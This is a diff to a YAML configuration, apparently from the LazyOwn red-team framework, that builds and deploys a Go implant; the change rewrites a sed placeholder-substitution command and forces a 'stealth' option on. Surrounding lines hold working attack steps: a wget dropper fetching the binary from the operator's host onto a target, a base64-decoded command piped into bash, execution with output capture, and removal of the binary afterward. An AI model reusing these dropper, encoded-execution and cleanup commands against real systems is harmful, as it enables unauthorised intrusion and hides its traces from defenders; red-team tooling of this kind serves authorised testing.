@@ -14,20 +14,11 @@ pid: ""
 param: ""
 encoder: base64
 shellcode: ""
-replace_command: | 
-  cp {output_path}/implant/implant_crypt.go {output_path}/{name} ; 
-  sed -i 's|{lport}|{lport}|g; s|{line}|{line}|g; s|{lhost}|{lhost}|g;
-           s|{username}|{username}|g; s|{password}|{password}|g;
-           s|{platform}|{platform}|g; s|{sleep}|{sleep}|g;
-           s|{maleable}|{maleable}|g; s|{useragent}|{useragent}|g;
-           s|{key}|{key}|g; s|{stealth}|{stealth}|g;
-           s|{user_agent_1}|{user_agent_1}|g; s|{user_agent_2}|{user_agent_2}|g;
-           s|{user_agent_3}|{user_agent_3}|g; s|{url_trafic_1}|{url_trafic_1}|g;
-           s|{url_trafic_2}|{url_trafic_2}|g; s|{url_trafic_3}|{url_trafic_3}|g' {output_path}/{name}
+replace_command: "cp {output_path}/implant/implant_crypt.go {output_path}/{name} ; sed -i 's|{{lport}}|{lport}|g; s|{{line}}|{line}|g; s|{{lhost}}|{lhost}|g; s|{{username}}|{username}|g; s|{{password}}|{password}|g; s|{{platform}}|{platform}|g; s|{{sleep}}|{sleep}|g; s|{{maleable}}|{maleable}|g; s|{{useragent}}|{useragent}|g; s|{{key}}|{key}|g; s|{{stealth}}|True|g; s|{{user_agent_1}}|{user_agent_1}|g; s|{{user_agent_2}}|{user_agent_2}|g; s|{{user_agent_3}}|{user_agent_3}|g; s|{{url_trafic_1}}|{url_trafic_1}|g; s|{{url_trafic_2}}|{url_trafic_2}|g; s|{{url_trafic_3}}|{url_trafic_3}|g' \"{output_path}/{name}\""
 copy_command: "cowthink -bdgpstwy LazyOwn RedTeam Framework. The best OpSec T00l"
 compile: "CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags='-s -w' -o {output_path}/{binary} {output_path}/{name}"
 droper: "wget -O {target_path}/{binary} http://{lhost}/{binary}"
 command: "cd {target_path} ; ./{binary} | tee {target_path}/output_{name}.txt"
 payload: "/bin/echo '{base64_command}' | /bin/base64 -d | /bin/bash"
 clean_cmd: "rm {target_path}/{binary} -rf"
-sleep: 6
+sleep: "6"
